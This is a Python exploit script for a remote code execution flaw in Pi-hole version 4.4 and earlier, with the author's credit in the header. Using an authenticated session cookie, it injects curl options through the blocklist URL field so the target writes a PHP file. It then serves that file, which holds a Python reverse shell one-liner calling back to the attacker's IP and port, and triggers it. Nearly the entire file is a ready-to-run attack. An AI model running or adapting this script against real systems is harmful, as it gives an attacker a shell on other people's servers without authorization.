#!/usr/bin/env python3

# Pi-hole <= 4.4 RCE
# Author: Nick Frichette
# Homepage: https://frichetten.com
#
# Note: This exploit must be run with root privileges and port 80 must not be occupied.
#       While it is possible to exploit this from a non standard port, for the sake of
#       simplicity (and not having to modify the payload) please run it with sudo privileges.
#       Or setup socat and route it through there?

import requests
import sys
import socket
import _thread
import time

if len(sys.argv) < 4:
    print("[-] Usage: sudo ./cve.py *Session Cookie* *URL of Target* *Your IP* *R Shell Port* *(Optional) root*")
    print("\nThis script will take 5 parameters:\n  Session Cookie: The authenticated session token.\n  URL of Target: The target's url, example: http://192.168.1.10\n  Your IP: The IP address of the listening machine.\n  Reverse Shell Port: The listening port for your reverse shell.")
    exit()

SESSION = dict(PHPSESSID=sys.argv[1])
TARGET_IP = sys.argv[2]
LOCAL_IP = sys.argv[3]
LOCAL_PORT = sys.argv[4]

if len(sys.argv) == 6:
    ROOT = True

# Surpress https verify warnings
# I'm asuming some instances will use self-signed certs
requests.packages.urllib3.disable_warnings()

# Payload taken from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# I opted to use the Python3 reverse shell one liner over the full PHP reverse shell.
payload = """<?php
  shell_exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);'")
?>
""" %(LOCAL_IP, LOCAL_PORT)

def send_response(thread_name):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((LOCAL_IP,int(80)))
    sock.listen(5)

    connected = False
    while not connected:
        conn,addr = sock.accept()
        if thread_name == "T1":
            print("[+] Received First Callback")
            conn.sendall(b"HTTP/1.1 200 OK\n\nstuff\n")
        else:
            print("[+] Received Second Callback")
            print("[+] Uploading Payload")
            conn.sendall(bytes(payload, "utf-8"))
        conn.close()
        connected = True

    sock.close()

_thread.start_new_thread(send_response,("T1",))


# Fetch token
resp = requests.get(TARGET_IP+"/admin/settings.php?tab=blocklists", cookies=SESSION, verify=False)
response = str(resp.content)
token_loc = response.find("name=\"token\"")
token = response[token_loc+20:token_loc+64]


# Make request with token
data = {"newuserlists":"http://"+LOCAL_IP+"#\" -o fun.php -d \"","field":"adlists","token":token,"submit":"saveupdate"}
resp = requests.post(TARGET_IP+"/admin/settings.php?tab=blocklists", cookies=SESSION, data=data, verify=False)
if resp.status_code == 200:
    print("[+] Put Stager Success")


# Update gravity
resp = requests.get(TARGET_IP+"/admin/scripts/pi-hole/php/gravity.sh.php", cookies=SESSION, verify=False)


time.sleep(3)
_thread.start_new_thread(send_response,("T2",))


# Update again to trigger upload
resp = requests.get(TARGET_IP+"/admin/scripts/pi-hole/php/gravity.sh.php", cookies=SESSION, verify=False)

print("[+] Triggering Exploit")
try:
    requests.get(TARGET_IP+"/admin/scripts/pi-hole/php/fun.php", cookies=SESSION, timeout=3, verify=False)
except:
    # We should be silent to avoid filling the cli window
    None